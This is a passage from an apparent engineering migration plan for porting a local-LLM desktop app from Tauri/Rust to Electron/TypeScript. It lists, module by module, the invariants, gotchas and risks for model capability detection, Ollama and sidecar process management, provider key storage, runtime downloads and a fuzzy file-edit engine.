The single declared capability record per engine: tri-state Support (Yes/No/Unknown - Unknown is first-class), a closed Capability enum with user-facing phrases, five EngineDecl transport declarations (ollama, ollama-cloud, claude-cli, codex-cli, openrouter) each carrying streaming/image-channel/tool-calling/structured-output/tier, engine_id_of model->engine mapping (BOTH ':cloud' and '<size>-cloud' spellings), ollama_runs_here transport locality, capabilities_for (declaration refined by /api/show, provider catalog, codex catalog), vision_support fast path, preflight Verdicts with BlockCode (Capability vs PrivacyDoor), and the derived provider x agent support matrix (sidecar /agent_support + tier tool names).

**Replacement:** TS module in Electron main: the DECLARED table as a typed const array, Support as a string union, capabilities_for composing the same live lookups (ollama capabilities via sidecar, provider facts from the providers module cache, codex catalog from the external module); the matrix IPC handler still POSTs /agent_support to the sidecar. All pure functions (engine_id_of, preflight, vision_door_block, engine_available, agent_rows) port with their tests.

**Must preserve:**
- Support::Unknown is the load-bearing arm: 'the sidecar is down' and 'this model reports no vision' are different facts - collapsing to false is how a broken engine read as a product limit. Preflight refuses only on a definite No; Unknown passes through as a caveat, never a verdict
- engine_id_of catches BOTH hosted spellings: exact ':cloud' AND a tag ending '-cloud' (gpt-oss:120b-cloud) - the old is_cloud_model||is_external_engine pair missed the second and told the user their document stayed local while it went to ollama.com; the cost asymmetry is stated in the doc (false exclusion = a cosmetic label; false inclusion = content leaving under a promise it would not)
- Locality = engine-declared-local AND ollama_runs_here (base_is_local over the resolved base URL, the SAME predicate the daemon manager uses) - the Closet override moves the same tag off-Mac, and every privacy decision reads this composed answer; served_by_ollama_engine is deliberately the ENGINE-only question for list-picking (the privacy question would leave no model to name)
- Transport declarations that must survive: CLI engines cannot stream and have NO image channel regardless of model; ollama-cloud declares tool_calling No AND structured_output No (leaks tool calls inline as text; ignores format grammar) and the declared No must survive a live catalog claiming 'tools'; local Ollama tool-calling is Unknown until /api/show answers; the bridge tier is a FIELD of the record so sidecar::bridge_scope_for and the published matrix cannot disagree (only an engine running on this Mac gets the screen-driving tools - owner decision 2026-07-25)
- Embedding models short-circuit chat/vision/tools to No WITHOUT a round trip (it is also the only answer available with the sidecar down; a reachable engine overwrites it); a listed local Ollama model gets image/video generation No (its vocabulary has no term for it) so the Create page can say WHY, while silence from a catalog stays Unknown = do-not-offer
- preflight's door check runs FIRST for Vision and only on a CONFIRMED Yes (vision_door_block on Unknown would assert a capability of an unreachable engine); BlockCode is the machine-readable WHY - Settings shows the download-a-vision-helper button on Capability and hides it on PrivacyDoor, and the first version matching on prose got that exactly wrong
- The matrix is DERIVED end-to-end (owner decision #3: surface, never hand-maintain): capability columns from DECLARED, agent columns from the sidecar's registry given tier_tool_names per tier, one request carrying all distinct tiers; agents_known = 'did the sidecar answer' NOT 'did it name agents' - an empty list is a real answer and an undecodable shape gets its own sentence instead of reading as a network failure
- engine_available reads real state only (installed tags by engine, detected CLIs, saved provider key); the ollama row uses the engine question, not locality (a remote-Ollama room is when the row is most in use)
- declared_for falls back to the OLLAMA record instead of panicking on an unknown id - a test pins that the fallback never answers a real selection

**Gotchas:**
- The serde wire shapes (lowercase support values, tagged Verdict, camelCase EngineCapabilities, kebab-case BlockCode) are parsed by apiTypes.ts - keep them or change both sides together
- capabilities_for makes up to two sidecar round trips per call (capabilities + context_length); vision_support exists precisely to skip the context call when grounding_pick loops every installed model - keep the split
- primary_cli_scope()/ToolScope live in the commands/room_mcp modules (another inventory group) - the tier field couples this file to the MCP bridge rewrite

**Native/Tauri surface:** tauri::command/State; serde tagged enums (Verdict {status,...}, Support lowercase, BlockCode kebab-case - wire shapes the frontend parses)

### `src-tauri/src/ollama.rs` — 847 LOC → electron-main (4 d)

The Phase-1 gateway: every non-agent model call POSTs to the sidecar (never Ollama directly). Base-URL layering (ARCELLE_OLLAMA_URL env + runtime 'closet supercomputer' override), chat_structured (JSON-schema grammar via Ollama format), plain generate, handoff_summary, embed, warm, pull_cancellable (NDJSON progress, stall guard), delete/list models, native_context_length, capabilities metadata, plus strip_think_spans and recover_json text hygiene.

**Replacement:** TS module in Electron main: thin typed wrappers over the SidecarClient (same endpoint paths and body schemas - the Python side is unchanged), the base-URL override in a settings-backed variable, strip_think_spans/recover_json as pure TS functions with the existing test cases ported.

**Must preserve:**
- CRITICAL Ollama semantics: `format` constrains the output grammar but the model NEVER SEES the schema - the schema JSON is appended to the last user message or small models emit empty-string fields
- recover_json: Ollama :cloud models ignore `format` and fence-wrap JSON or emit <think> preambles - strip think spans (an UNTERMINATED <think> truncates the rest) then slice first-bracket..last-bracket
- One shared generation budget with sidecar.rs (client_timeout() READS SIDECAR_TIMEOUT; two constants drifted once and cut claude-cli generations at 600s); METADATA_TIMEOUT=60s stays separate so a Settings badge never hangs an hour; test pins EXTERNAL_IDLE(900s) < client budget
- map_send_err: connect=>OLLAMA_DOWN, timeout=>its own message quoting the real seconds (a timeout is NOT 'Ollama down' - the user may not even have Ollama)
- Metadata reads (list/capabilities/delete/context_length) deliberately never wake_daemon; generation paths wake it and hold the Busy guard, skipping the daemon entirely for external/CLI models
- pull_cancellable: NO whole-request timeout (multi-GB) but a 300s between-chunks stall guard; cancel polled every 150ms even while quiet; PULL_CANCELLED is a shown sentence, not a branched-on sentinel; progress lines can carry classified {code,error} that rebuild OLLAMA_DOWN/MODEL_MISSING:<model>
- handoff_summary strips think spans from the recap (it REPLACES the conversation; leaked reasoning must not become the memory) and an empty result is a failed handoff
- Base-URL precedence: runtime override > env > http://127.0.0.1:11434, trailing slashes/whitespace trimmed, empty clears; resolved_base_url() is passed in every request body (the sidecar holds no copy)
- EMBED_MODEL='nomic-embed-text'; embed returns per-input f32 vectors and callers treat any error as 'silently fall back to keyword search'

**Gotchas:**
- The include_str! lint-test (no unauthenticated posts) and the textual KEEP_ALIVE pin in ollama_lifecycle do not port - replace with an ESLint rule or a unit test over the client module's single request factory
- warm() uses the KEEP_ALIVE_WARM constant, not a literal - the idle-sleep policy is derived from it (drift = daemon killed under a warm model)

**Native/Tauri surface:** reqwest (streaming for /pull); tokio select

### `src-tauri/src/commands/providers.rs` — 742 LOC → electron-main (3 d)

API provider integration (OpenRouter today): key storage in macOS Keychain (service 'Arcelle LLM Providers'), catalog fetch (/models/user + the public /models?output_modalities=image|video media merges), parse into ExternalModelInfo (capabilities from supported_parameters/architecture, NEVER slug match), the in-memory ModelRuntimeFacts cache with once-per-process load + 5-min failure-retry window, 401-driven rejected-key state (flips the Connected badge), and provider_runtime_config/inject_provider_runtime that attach {api_key, base_url, model, context_window, supports_tools} to sidecar request bodies.

**Replacement:** TS module in Electron main. Key storage via Electron safeStorage (encrypted blob in userData) with a one-time migration that reads the existing Keychain item ('Arcelle LLM Providers'/'openrouter') - readable from the Python sidecar via PyObjC/Security or a `security find-generic-password` call during migration. Catalog fetch with undici; caches as module-level Maps; the snake_case ProviderRuntimeConfig field names are pinned by the Python sidecar and must not be camelCased.

**Must preserve:**
- Media catalogs MUST come from the PUBLIC /models?output_modalities=X - /models/user silently IGNORES unknown query params and returns the full chat list (verified live: 400 default entries with ZERO video models vs 21 behind the filter, 11 vs 42 for image), so the merge finds nothing and the Create page reads 'Video 0' with no error anywhere. A test pins the path shape against this exact re-'tidying'
- Capabilities from catalog metadata only: tools/reasoning/structured from supported_parameters; vision = image INPUT modality; image_output/video_output = OUTPUT modalities - never the slug ('qwen-image-vision' reads pictures and draws nothing); media entries have context_length 0, no supported_parameters, and '0' pricing and must not be dropped; final list re-sorted after merging (three sorted batches appended are not sorted)
- /models/user is fetched first as the authenticated key check; media catalog failures are non-fatal (losing the whole list beats losing a few Create rows); cache write + catalog_loaded flag set only on success
- Failure retry window: catalog_loaded is only set on success, so without CATALOG_RETRY_AFTER=5min every AI call re-issued the full fetch (offline: +30s timeout per call; expired key: a 401 per call); single-flighted so concurrent calls share one attempt; ensure_provider_catalog is a cheap no-op for non-provider models and for anything already cached
- Rejected-key state: a real 401 from the provider marks the key rejected and provider_connected turns false (the green badge used to mean only 'a key is saved'); connecting a fresh working key or disconnecting clears it; no re-testing on render (spends rate limit, flips on mere offline)
- provider_runtime_config unknown-model default is (None, tools=true); a missing key produces a full user-facing sentence naming the provider and both fixes (the generic Keychain error was upstream-rewritten into 'the agent sidecar could not start')
- ModelRuntimeFacts is Copy on purpose (handed out of the RwLock by .copied()); provider model addressing is 'openrouter::<slug>' - splitn(3,'::').nth(1)

**Gotchas:**
- safeStorage is NOT the Keychain item store - existing users' keys live in the real Keychain under 'Arcelle LLM Providers' and need a one-time migration read; the app's new signing identity may be denied ACL access to the old item, so plan for a re-enter-key fallback message
- The in-memory catalog cache is empty after every restart by design - the ensure_provider_catalog call sites on every AI path are what make a provider room work without opening the picker; do not drop them as 'redundant'

**Native/Tauri surface:** security_framework (Keychain generic passwords); reqwest (bearer_auth, HTTP-Referer/X-OpenRouter-Title headers)

### `src-tauri/src/commands/models.rs` — 698 LOC → electron-main (3 d)

Model selection, status and lifecycle commands: best_default/best_local_default (embedding models excluded; the INSTALLED variant tag returned, never the bare constant), capability-asked vision (chat_model_sees_images), grounding_pick order-of-truth, image_reaches_model (privacy-door pixel gate), ai_status (session-cached CLI probe + provider fold-in), model_capabilities badges, open_ollama launcher, warm_model (one model only), pull_model (throttled progress + cancellable via the shared registry), delete_model, registry-name normalization.

**Replacement:** TS module in Electron main exposing the same seven IPC handlers; pure pickers (best_default, registry_name, vision_keep_alive) port with their tests verbatim; open_ollama via child_process.execFile('open',['-a','Ollama']) checking the exit status; total RAM via os.totalmem().

**Must preserve:**
- installed_default returns the tag Ollama actually LISTED (exact match first, then prefix): returning the bare DEFAULT_MODEL constant on a Mac holding only qwen3.5:4b-mlx made the privacy scan fail on all 20 files with 'model not found' (live QA 2026-08-19)
- registry_name: lowercase ONLY bare name:tag (ollama.com is lowercase; /api/pull files a model under the LITERAL string, and for hosted models /api/chat strips -cloud and proxies the rest verbatim - one capital bricks the model forever); anything containing '/' (hf.co/Owner/Repo, namespaces) is someone else's case-SENSITIVE registry and must pass through untouched
- is_embedding_model models never become the chat model (they 400 on /api/chat - broke flashcards/marking); best_local_default additionally requires served_by_ollama_engine (the MODEL question, not the privacy one - with the Closet override set, the privacy predicate would reject every tag and leave nothing to name)
- Vision is ASKED (Ollama /api/show capability, provider catalog), never name-matched; Unknown collapses to false at THIS caller because the question is 'may we hand it pixels'
- grounding_pick: (1) the room's own model if capable AND image_reaches_model; (2) any installed on-Mac model reporting vision (pixels must not leave the machine on a pick the user never made); (3) None - only then is 'nothing can see images' true. image_reaches_model: a capable cloud model behind the closed privacy door is NOT eligible (the door strips pixels and only counts them; the empty answer rendered as a false 'could not locate that' about the user's photo)
- ai_status: CLI detection cached in external_cache for the session (each probe forks an interactive zsh that sources .zshrc; ai_status runs on every image open) - the cache must be READ, not overwritten (a regression spawned TWO probes per call); openrouter appended when a key is connected; reachable Ollama implies installed
- warm_model warms exactly ONE model (two resident models crash Ollama on 16 GB Macs); for CLI rooms it warms the best local model instead (vision stays fast); vision_keep_alive: same-model or >=32 GB => 30m, else 2m
- pull_model: cancel flag registered under 'pull:<typed name>' in the SAME registry chat Stop uses (the frontend rebuilds the key from the name it typed - key on the typed name, not the normalized one); progress throttled to phase changes / 0.5% steps / 100% (raw NDJSON is hundreds of lines/sec, each an IPC message + React render); PULL_CANCELLED reads as stopped, not error
- open_ollama WAITS for `open`'s exit status (spawn-and-forget reported 'Unable to find application' as success) and the failure message names the `ollama serve` escape hatch for CLI-only installs

**Gotchas:**
- The progress-throttle must survive the port - naive forwarding floods the IPC channel and re-renders the bar hundreds of times per second
- CancelGuard removes the registry entry on every return path - use try/finally around the whole pull

**Native/Tauri surface:** tauri::command/State/Window::emit (pull-progress); sysinfo (total RAM); std::process::Command ('open -a Ollama'); tauri::async_runtime::spawn_blocking

### `src-tauri/src/ollama_lifecycle.rs` — 644 LOC → electron-main (3 d)

Self-managing local Ollama daemon: ensure_up spawns `ollama serve` on demand (local base URLs only), Busy RAII keeps it awake and winds the idle clock at both ends, an idle watcher SIGTERMs it after IDLE_SLEEP (warm window 30m + 5m, DERIVED not written), PID-file adoption reclaims a daemon orphaned by a crash (verified via `ps` command line before earning the right to SIGTERM), base_is_local host classification (also the privacy door's transport predicate), note_room_closed winds the clock back on lock.

**Replacement:** TS module in Electron main: child_process.spawn of the resolved ollama binary, fetch /api/version reachability, a setInterval watcher applying the same pure should_sleep policy, PID file in the temp dir, ps verification via execFile. Host parsing via a hand-rolled host_of (NOT new URL(), which throws on bare host:port strings this accepts).

**Must preserve:**
- Safety rule: only ever stop a daemon WE spawned; an external Ollama.app / hand-run serve records no PID and is never touched; remote base URLs are never started or stopped (report OLLAMA_DOWN)
- IDLE_SLEEP is DERIVED from KEEP_ALIVE_WARM_WINDOW(30m)+5m - it was once a 5min literal that SIGTERMed the daemon holding a 30min-warm model, making every return pay a cold start
- Busy::new takes the our_pid lock and winds last_used at START and end - the watcher holds the same lock across its entire check-and-kill so a call can never be admitted onto a daemon already being terminated
- base_is_local parses the HOST (scheme/credentials/port/path stripped, IPv6 unbracketed): localhost/0.0.0.0/::1/::/127.* only - substring matching accepted 'localhost-box.lan' and 'ollama.127.0.0.1.nip.io'. This is ALSO the transport half of the privacy question (capabilities::ollama_runs_here) - one answer for both
- Adoption: pid file + is_ollama_serve (`ps -p N -o command=` must be '<path>/ollama serve' EXACTLY - not a wrapper script containing the word) reclaims a daemon a force-quit orphaned; junk/recycled PIDs are forgotten, never killed
- ollama binary resolved once: /Applications/Ollama.app/Contents/Resources/ollama preferred, else `zsh -ilc command -v ollama` (GUI launches have a bare launchd PATH); spawned directly so the stored PID is the daemon itself
- Single-flight spawn: the loser of a concurrent-spawn race used to fail to bind, exit, and overwrite our_pid with a dead PID - after which the watcher killed the wrong process
- note_room_closed winds the clock to expire (kills nothing itself); stop_if_ours removes pid file only when something was actually stopped (a crashed run's PID record is the ONLY path to adoption); daemon stderr mirrored to arcelle-ollama.log, removed on clean quit

**Gotchas:**
- The `zsh -ilc` probes source the whole .zshrc and are the diagnosed root cause of the TCC 'data from other apps' prompt loop (2026-08-16, never fixed) - the rewrite reproduces it verbatim if ported as-is; probe once, cache hard, and consider checking fixed paths first
- Node has no RAII - the Busy guard becomes an acquire/release pair and every early return/throw must release (wrap in try/finally or a using-declaration Disposable)

**Native/Tauri surface:** std::process::Command (zsh -ilc, ps, kill); tauri::async_runtime::spawn (watcher); reqwest

### `src-tauri/src/sidecar_lifecycle.rs` — 617 LOC → electron-main (3.5 d)

Process manager for the Python sidecar: spawn the bundled PyInstaller onedir binary (Resources/sidecar/arcelle-sidecar/arcelle-sidecar) or dev `$ARCELLE_SIDECAR_PYTHON -m arcelle_sidecar`, learn the ephemeral port from the 'SIDECAR_PORT=N' stdout handshake, health-check, hand out the base URL, mint and attach the per-process bearer token, count in-flight requests, classify probes (Healthy/Busy/Gone), replace only a wedged-and-idle or gone sidecar, rotate stderr logs, SIGTERM on exit.

**Replacement:** TS module in Electron main using child_process.spawn with piped stdio; readline over stdout for the port handshake; fetch-based /health probes with the same 3-attempt Busy/Gone classification; token via crypto.randomUUID pair in the child env; stderr piped through a byte-budgeted file writer to app.getPath('temp').

**Must preserve:**
- Only ever stop a process WE spawned; bound to 127.0.0.1 only; the sidecar never sees the room key (tools flow through the token-guarded MCP bridge)
- Bearer token (2 UUIDs, 244 bits) minted once per app process, passed in the child ENVIRONMENT (ARCELLE_SIDECAR_TOKEN) never stdout/argv/logs; authed() is the single place the header is spelled and a lint-test asserts no .post to the base goes unauthenticated
- should_replace policy: Healthy=>never; Busy(connection accepted but silent)=>only when inflight==0; Gone(connection refused)=>always. One missed 1.5s probe used to SIGTERM a sidecar mid-stream - a wedged Python still holds its socket so it times out, a dead port refuses instantly
- Single-flight spawn (async mutex) so concurrent asks never launch two sidecars; re-check under the lock
- stderr MUST be drained once piped (an unread pipe wedges the child mid-write) and is the sidecar's ONLY diagnostic channel; log rotated to arcelle-sidecar.prev.log on each spawn so the crash that triggered an auto-restart survives it; 2 MB on-disk budget but draining continues past it; both logs deleted on clean quit
- Port learned from the announce line, not env: the bundled PyInstaller binary ignores SIDECAR_PORT and PRINTS its port (confirmed in release QA)
- Child handle parked on a wait()er so restarts leave no <defunct> zombies; START_TIMEOUT 30s covers slow langgraph import; failure messages name the stderr log path and keep the reason (SIDECAR_UNAVAILABLE: <reason>)

**Gotchas:**
- In Node, a spawn'd child's pipes must be actively consumed (resume/pipe) or the same wedge occurs; 'ignore' loses the only traceback
- kill() in Node signals the direct child - fine here because the binary is spawned directly (no shell), keep it that way
- base_url_if_running exists so room teardown can /forget WITHOUT starting the sidecar - do not route teardown through ensureUp

**Native/Tauri surface:** std::process::Command (kill by PID via /bin/kill); reqwest; tokio spawn_blocking for the blocking stdout read

### `src-tauri/src/commands/runtimes.rs` — 555 LOC → electron-main (2 d)

Download-on-first-use runtimes for local stdio MCP connectors: pinned uv 0.12.5 and Node v22.11.0 macOS tarballs with hardcoded per-arch SHA-256 digests, stream-hash-verify-then-extract into appData/runtimes/<kind>, publish a PATH prefix the connector launcher prepends (cached in a global cell because the launcher has no AppHandle), and status_for deciding available/provisionable/needs-Docker per connector command.

**Replacement:** TS module in Electron main: undici streaming download hashed with node:crypto as it arrives, extraction via /usr/bin/tar spawn (bsdtar auto-detects gzip) with --strip-components=1, install root at path.join(app.getPath('userData'),'runtimes'), runtime-progress events over webContents.send, PATH prefix in a module-level variable the MCP launcher imports.

**Must preserve:**
- Digests are PINNED IN THE BINARY, per arch, deliberately not fetched beside the download (a same-host same-session checksum proves nothing if the session is tampered); asset() returns URL+digest together so they cannot drift; never '/latest/' URLs (two installs of the same app build must not run different binaries); refusal on mismatch deletes the download and says expected/got/'nothing was installed' in full
- Verification happens BEFORE unpacking (executable content; TLS only proves who terminated the connection); bytes hashed as they stream so what is checked is exactly what was written; digest comparison case-insensitive (checksum files publish both spellings)
- This reaches the internet so it is explicit and user-triggered; the UI note names the source and rough size (astral.sh ~22 MB / nodejs.org ~45 MB); Docker-family commands are declared non-provisionable with an install-it-yourself note
- for_command maps by the command's LEAF (uvx/uv/uvenv=>uv, npx/npm/node=>node); which_in resolves by basename against each PATH dir; the effective PATH is downloaded-prefix + login-shell PATH so a downloaded uvx beats the system one
- refresh_path_prefix must run at startup AND immediately after a provision - without it the freshly downloaded bin dir is on no PATH any child sees until restart, and the connector the user downloaded it FOR still fails
- Extraction into a clean dir, marker-file check afterwards, failed unpacks removed; idempotent when already installed; downloads use rustls in Rust because macOS native-tls doesn't reliably ALPN h2 to nodejs.org/GitHub (undici is unaffected)
- History lesson in the module doc: this entire feature once shipped complete, unit-tested and NEVER WIRED (not in invoke_handler, launcher not reading the prefix) - the four halves only make sense registered together

**Gotchas:**
- Version bumps must change URL and digest together - port the pinning test
- The launcher-side consumption (mcp.rs prepending cached_path_prefix) is OUTSIDE this file; the rewrite must wire the equivalent import or reproduce the shipped-inert bug

**Native/Tauri surface:** tauri::AppHandle::path().app_data_dir(); tauri::Emitter (runtime-progress); tokio::process::Command (/usr/bin/tar); sha2; reqwest rustls

### `src-tauri/src/model_limits.rs` — 37 LOC → electron-main (0.25 d)

Fallback max-context constants for the external CLI engines: CLAUDE_FALLBACK_MAX_CONTEXT=200_000 (used only when the live per-turn modelUsage.contextWindow is absent) and CODEX_MAX_CONTEXT=272_000 (last resort when the live `codex debug models` catalog lookup fails or no submodel was chosen); external_max_context(engine) dispatcher.

**Replacement:** A tiny TS constants module in Electron main, kept next to the CLI-engine code; preserve the doc comment explaining the precedence (live catalog/live envelope first, constants last).

**Must preserve:**
- These are FALLBACKS only: Claude's real window rides each response envelope (parsed sidecar-side), Codex's real window comes from its catalog per slug and varies ~4x between models - a single constant materially misrepresents the token-budget bar (confirmed by a live user report 2026-07-21)
- Ollama and provider models need no entry here - the sidecar reads their advertised context length itself

**Gotchas:**
- Do not 'complete' this into a maintained model table - the module doc explains why live sources beat any registry

**Subsystem risks:**
- Error-sentinel strings are a byte-exact cross-layer contract: 'OLLAMA_DOWN' is the frontend's literal trigger for the Open Ollama button, 'MODEL_MISSING:<model>' is branched on, 'SIDECAR_UNAVAILABLE:' / SIDECAR_DOWN prose are matched upstream, and PULL_CANCELLED is shown verbatim - since src/api.ts is being rewired anyway, either preserve every token or migrate both sides in one commit with a contract test
- Cancellation semantics do not port for free: aborting a fetch (AbortController) does NOT stop the sidecar's non-streaming handlers (measured multi-second run-on against pinned uvicorn), so the delivered /cancel-with-run_id protocol, the known-field verification, and the one-retry-on-race must be reimplemented exactly - a 'simplified' abort-only port silently burns the single local-model slot after every Stop
- The timeout lattice is an ordered system, not independent constants: metadata 60s < pull-stall 300s < caller watchdogs 300/960s < sidecar EXTERNAL_IDLE 900s < STREAM_IDLE 1200s < request 3600s < chain 10h, with the two gateways sharing ONE generation budget (they drifted once and truncated hour-long CLI sessions at 10 minutes) - port the pinning tests, not just the numbers
- The zsh -ilc probes (CLI detection, ollama binary resolution, CLI execution PATH) source the user's whole .zshrc and are the diagnosed-unfixed root cause of the endless macOS TCC 'data from other apps' prompt loop; the Electron rewrite will inherit it unless probes are cached once per session (the ai_status regression that spawned two probes per call is the cautionary tale) and execution switches to shell-less spawn of pre-resolved absolute paths
- Keychain migration: OpenRouter keys live in the real macOS Keychain (service 'Arcelle LLM Providers') and the room-crypto subsystem uses Keychain 'PrivateRoom'; Electron safeStorage is a different store, and a changed signing identity can lose ACL access to the old items - the one-time .room converter needs a key-migration step plus a graceful re-enter-key path, and note that ad-hoc signing resets TCC grants on every rebuild
- The privacy door's transport predicate (base_is_local -> ollama_runs_here -> image_reaches_model -> declared_for().local) is what keeps content on the Mac under the 'Local only' chip; porting host parsing to new URL() or a substring check re-opens the exact leaks these functions were written against (localhost-lookalike hosts, the <size>-cloud tag spelling, the Closet override) - port the differential tests that assert the OLD wrong predicates still fail
- Process-lifecycle races were closed with lock discipline (watcher holds the admission lock across check-and-kill; busy counts protect a streaming sidecar from health-probe replacement; single-flight spawns; PID-file adoption gated on ps verification): Node's single event loop removes data races but every await is a yield point - the Busy/inflight bookkeeping must be try/finally-exact or a wedged-sidecar replacement will again kill in-flight answers, and unconsumed child stdio pipes wedge children in Node just as in Rust
- run_external's shell-word construction is a live attack surface (the model string arrives inside shareable .room files); the TS port must use argv-array spawn with no shell AND keep the slug allowlist, and must reproduce the temp-dir guarantee (decrypted attachments + MCP bearer token removed on every exit path, failures logged by path)
- Several invariants are enforced by Rust-specific meta-tests that do not port (include_str! lint asserting every sidecar POST is authed, the textual KEEP_ALIVE_WARM pin, compile-time exhaustive Capability matching) - each needs a TS equivalent (single request factory + ESLint rule, shared constant import, exhaustive switch with never-check) or the guarded regressions return unwatched
- Event identity and payload fidelity: ask-* events must keep the TurnId envelope (runId/chatId), the foreign-run_id line drop, the usage payload's t/run_id stripping (it is persisted into room message rows), and the per-round mirror reset - losing any of these re-opens the orphaned-run painting, leaked-id persistence, and 'the reply was lost' bugs that took three QA waves to close
- Two heavy operations sit on hot paths and will freeze Electron's main process if ported naively: the 230 MB Claude executable scan (needs a worker_thread) and pull progress (hundreds of NDJSON lines/sec that must stay throttled to 0.5% steps before crossing IPC)

## 9. App shell & misc

Shell-app-misc subsystem: the Tauri app entry/lifecycle (lib.rs/main.rs), native menu bar (menu.rs), the commands module hub with AppState + shared constants (commands.rs), the privacy-preserving host event log (obs.rs), the macOS textutil converter bridge (textutil.rs), the offline roomai CLI (bin/roomai.rs), and seven command modules: feedback drafting, room safety ops (versions/export/rekey/duplicate/compact), the diff-preview edit gate, the fuzzy byte-safe edit engine, bulk file verbs, the script consent/run surface, room-wide search, and the RAG retrieval core with its background backfill passes. 11,439 LOC total, 28 #[tauri::command] handlers in-group (lib.rs additionally registers all 308 app-wide). Most of this ports to Electron main (TS): IPC registry, Menu.buildFromTemplate, protocol.handle for roommedia (Range/206) and roomdoc (CSP-sandboxed HTML), before-quit unsaved-edits hold + recording flush, logfmt logger, edit engine, retrieval math over better-sqlite3 FTS5 + Float32Array cosine. textutil goes to the Python sidecar (document parsing per split rule); roomai becomes a small Node CLI sharing the new DB module. Two structural notes: (1) Electron's before-quit DOES fire on Cmd+Q, so the entire tao applicationShouldTerminate: workaround (custom Quit menu row, QUIT_ID machinery) collapses into one preventDefault flow — keep the latch semantics, delete the mechanism; (2) the get_webview_window child-webview trap disappears with Tauri, but its lesson (browser is a second WebContentsView on the same window) still shapes the Electron window architecture. Estimated ~48 senior-dev days including tests.

### `src-tauri/src/commands/edit_match.rs` — 2422 LOC → electron-main (7 d)

The byte-safe fuzzy edit engine behind edit_file/edit_files: normalization with per-char source byte spans (fold table for curly quotes/NBSP/CRLF/dashes/ligatures), unique-match requirement with ambiguity counts, paragraph-sentinel (no match across blank lines), ligature-split refusal, refinements (prefix/suffix context, occurrence, section), per-format branches (text exact→fuzzy, docx, HTML via position-preserving scanner; xlsx/pdf refused with redirects), PlannedWrite production, preview clipping centered on the first difference, one-transaction commit_plans, and the atomic ≤20-op batch (edit+rename) with shared batch-id cause. ~1000 of the 2422 lines are tests.

**Replacement:** TS module in Electron main (pure string/byte logic + DB transactions; no native APIs). Port the fold table (from the extraction module — coordination point with the docs subsystem), normalize_with_spans over Buffer byte offsets or consistently over code points, and commit via better-sqlite3 transactions. The docx/html replace helpers live in extraction (another subsystem) — the seam between them must be re-drawn together.

**Must preserve:**
- Uniqueness is the contract: multi-match fails with a count and closest_snippet hint instead of silently editing everything; non-overlapping count discipline matches content.matches().count()
- Only the exact byte span of the uniquely-identified passage is rewritten — normalization is for FINDING, the original bytes around the span are untouched (Hebrew/multibyte test pins this)
- A collapsed whitespace run spanning 2+ newlines becomes an unmatchable sentinel: a single-space needle can never splice two paragraphs (mirrors the docx matcher's rule)
- Ligature halves share one source span; a match beginning/ending mid-ligature is REFUSED (it would delete a letter the quote never named, reported as a clean replacement)
- MAX_FUZZY_BYTES 4MB: span-tracking normalization is 20-40x the file size in memory while the room is locked — above it, exact match stands alone with a distinct error
- Refinements honestly refused where unimplementable: positional ones for docx/html ('add more surrounding text instead'), section for non-html/md; docx and html branches apply the same >1-without-all ambiguity guard
- Preview: render via decode_text_bytes (NOT lossy UTF-8 — windows-1252/1255 files became boxes), extracted text for office formats; 200KB clip positioned so the FIRST DIFFERENCE is visible (head-clipping showed two identical heads and asked approval for an unseen change)
- Batch: validate-all-then-write in ONE BEGIN IMMEDIATE, ≤20 ops, all snapshots share 'AI edit (batch <id>)' cause for group undo; keep_ext guards renames from silently changing a file's format
- run_edit_file/run_edit_files are test-only reference entry points; production always goes plan_* → gate → commit_plans (same code path)

**Gotchas:**
- THE port risk of this group: all span logic is UTF-8 BYTE ranges; JS strings are UTF-16 code units. Decide one indexing basis (Buffer byte offsets recommended, since files are stored as bytes) and port the multibyte/ligature/Hebrew test corpus FIRST as the safety net
- The fold table lives in extraction::fold_edit_char, shared with the docx matcher — one table, two consumers; splitting it across Electron main and the sidecar would recreate the two-answers drift textutil.rs was built to end
- closest_snippet and the error strings are model-facing prompt surface: changing their wording changes agent behaviour; port them verbatim

**Native/Tauri surface:** sha2 (staleness hashes); rusqlite transactions

### `src-tauri/src/commands.rs` — 1234 LOC → electron-main (5 d)

Command-module hub: declares/re-exports ~60 submodules, defines AppState (room handle, cancel maps/tree, MCP consent state, job queue slot, generation stamps, rollback flag), Room/RoomInfo/FileMeta/Message/Chat and the other IPC DTOs, shared constants (history budgets, retrieval sizes, MCP config keys), humanize_storage_error, cloud-sync-folder detection, web-access gates (WebLanes), and the web_search_test command.

**Replacement:** TS: an AppState service class in Electron main (Maps + plain fields; JS single-threaded main removes the mutex, but keep an async-aware room-busy discipline for worker-thread ops); DTOs as zod schemas shared with src/apiTypes.ts; constants module; humanize_storage_error/is_synced_path/WebLanes as pure functions ported near-verbatim with their tests.

**Must preserve:**
- History hand-off is the WHOLE conversation (HISTORY_HANDOFF_MAX 200k backstop) — measured: any smaller amputation loses facts compaction cannot restore; handoff_budget_bytes = 2/3 of engine window × 3 chars/token (deliberately low ratio, overstates tokens) because the one-shot handoff gateway has no compacting receiver
- MAX_HISTORY_MESSAGES must be >= AGENT_HISTORY_MESSAGES (200): the hand-off marker is a hard cut-off for all later turns; a recap covering less than a turn silently loses conversation forever
- humanize_storage_error rewrites ONLY evidenced failures (checks the room file actually stopped existing before saying 'drive gone'), keeps the original error in brackets, never quotes the room path (an error string can become a tool result), and matches 'os error 2)' with the paren so errno 20-29 aren't misdiagnosed
- is_synced_path covers iCloud, Library/CloudStorage, and ~18 home folders including the 'Dropbox (Personal)/(Work)' legacy-dual-account pattern with trailing-separator discipline (Dropboxes/ is not Dropbox)
- web_provider legacy values ('duckduckgo' etc.) still mean internet-ON — that IS the migration, no rewrite step; only 'off'/unset is off; WebLanes default ALL (absent = on) and the download tools ride the search lane
- room_guard survives a poisoned mutex via into_inner — in TS this concern maps to: an exception mid-command must never leave the app-state wedged
- with_room is the single choke point where every storage error gets humanized; CancelGuard removes the cancel flag AND the cancel-tree entry on every exit path
- rollback_in_flight + room_epoch: every background writer pins path+epoch at spawn and re-checks before writing, because a rollback swaps the DB at the SAME path

**Gotchas:**
- Room.password is held in memory by design (the key is in SQLCipher memory anyway) so duplicate/rekey can work — the TS DB layer needs the same, keep it out of logs/serialization
- The mutex-not-Send-across-await discipline becomes: never interleave a multi-step DB transaction with an await that lets another IPC handler run — better-sqlite3 is sync, so wrap gated flows in explicit transactions
- Dozens of submodules re-export through this hub (commands::foo paths); the TS layout should not replicate the flat namespace — but src/api.ts call names must stay stable

**Native/Tauri surface:** tauri::State; rusqlite::Connection; tokio::sync::oneshot (consent reply channels)

### `src-tauri/src/obs.rs` — 1158 LOC → electron-main (4 d)

